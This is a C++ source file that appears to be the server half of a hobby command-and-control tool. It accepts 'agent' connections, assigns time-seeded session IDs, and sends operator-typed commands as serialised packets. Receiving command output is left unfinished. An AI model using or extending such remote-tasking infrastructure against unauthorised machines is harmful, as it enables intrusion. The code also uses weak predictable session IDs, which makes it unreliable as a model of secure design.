#include <iostream>
#include <cstring> // for memcpy()
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstdlib>
#include <thread> // used to implement multithreading so that tcp server can handle multiple clients
#include <random>
#include <print>
#include "server.hpp"
#include "packet.hpp"
#include "common.hpp"
// #include <openssl/ssl.h> // using openssl to encrypt the open socket communication
// #include <openssl/err.h>


void common::code_exit(){
    std::cout << "[*]Corrupted data exiting program...." << std::endl;
    exit(EXIT_FAILURE);
}


void common::socket_check(int soc_fd){ // socket failure error handling
    if(soc_fd < 0){
        std::perror("[*]connection failed");
        std::cout << std::endl;
        close(soc_fd);
        exit(EXIT_FAILURE);
    }
}


void common::accept_failed(int client_fd){
    if(client_fd < 0){
        std::perror("[*]couldn't accept connection");
        std::cout << std::endl;
        close(client_fd);
    }
}


std::vector<uint8_t> serialization(packet p1){
    size_t total_size = sizeof(p1.command_length) + sizeof(p1.session_id) + sizeof(p1.heartbeat) + p1.command.length();
    // doing sizeof(p1) causes padding of bytes so we will get wrong data 
    // since we are sending this through network we need to calculate their correct size 
    std::vector<uint8_t> byte_array(total_size); // creating a dynamic array of total_size bytes and it will have 1 byte continguous blocks of memory storage. arrays in vectors can shrink and increase since they are dynamic
    uint8_t *byte_array_ptr = byte_array.data(); // pointer of byte_array so that we can move it accordingly and writes bytes in the byte_array. also byte_array.data() produces the starting address of byte_array
    // since these 2 variables are 4 bytes so using htonl we set them to big endian order, the correct byte order for network communication
    if(byte_array_ptr == NULL){
        common::code_exit();
    }
    uint32_t cl = htonl(p1.command_length);
    uint32_t sid = htonl(p1.session_id);
    //copying bytes in memory (byte_array)
    byte_array_ptr = byte_array.data(); // setting the starting address for 
    std::memcpy(byte_array_ptr, &cl, sizeof(cl)); // copying command length bytes
    // incrementing pointer with respect to the bytes of cl(command_length) and sid(session_id)
    byte_array_ptr += sizeof(cl); 
    std::memcpy(byte_array_ptr, &sid, sizeof(sid));
    byte_array_ptr += sizeof(sid);
    std::memcpy(byte_array_ptr, &p1.heartbeat, sizeof(p1.heartbeat));
    byte_array_ptr += sizeof(p1.heartbeat);
    std::memcpy(byte_array_ptr, p1.command.data(), p1.command.length());
    return byte_array;
}


int server::get_session_id(){
    srand(time(0)); // setting the current time as seed value so that rand() number is new everytime
    int session_id = rand();
    return session_id;
}


packet packet_wrapping(std::string command, int session_id){
    //srand(time(0)); // setting the current time as seed value so that rand() number is new everytime
    packet p1;
    p1.command_length = command.length();
    p1.session_id = session_id;
    p1.heartbeat = 0;
    p1.command = command;
    return p1;
}


void server::send_commands(int soc_fd, int session_id){ // send message to client
    std::string command;
    packet p1;
    std::cout << "Enter command : " << std::endl;
    std::getline(std::cin >> std::ws, command);
    p1 = packet_wrapping(command, session_id);
    std::vector<uint8_t> byte_array = serialization(p1);
    if(send(soc_fd, byte_array.data(), byte_array.size(), 0) < 0){
        common::code_exit();
    }
}


void server::handle_multiple_clients(int client_fd, int session_id){
    std::cout << "[+] new agent connected" << std::endl;
    std::cout << "agent id : " << std::this_thread::get_id() << std::endl;
    send_commands(client_fd, session_id); // send msg to client
    std::vector<std::string> command_output;
    // receive stdout of the command executed in the agent.cpp side
}

void server::listener(){
    /*
    listener of tcp requires to perform the below functions
    1. socket creation
    2. struct sockaddr_in values configuration
    3. bind
    4. listen
    5. accept
    */
    int server_fd = socket(AF_INET, SOCK_STREAM, 0); // creating socket
    common::socket_check(server_fd);
    struct sockaddr_in server_address;
    server_address.sin_family = AF_INET; // IPv4 address
    server_address.sin_addr.s_addr = INADDR_ANY; //  accept conncetions from all network interfaces 0.0.0.0
    server_address.sin_port = htons(PORT); // listen to port 1234
    bind(server_fd, (struct sockaddr*) &server_address, sizeof(server_address)); // binding
    listen(server_fd, 2); // listening (max connection in queue = 2)
    while(true){ // kept in loop so that multiple clients can be handled
        // like if one agent connection is lost or connected the loop will start from while(true) again and try to accept new agent connection
        int client_fd = accept(server_fd, NULL, NULL); // accept connections from client
        common::accept_failed(client_fd);
        int session_id = get_session_id();
        // server object;
        std::thread client(&server::handle_multiple_clients, this, client_fd, session_id);
        client.detach();
        /*
        IMPLEMENT MULTITHREADING HERE TODO    
        */
    }
    std::cout << "[-]server exiting..." << std::endl;
    close(server_fd); // close server_socket created for listening
}
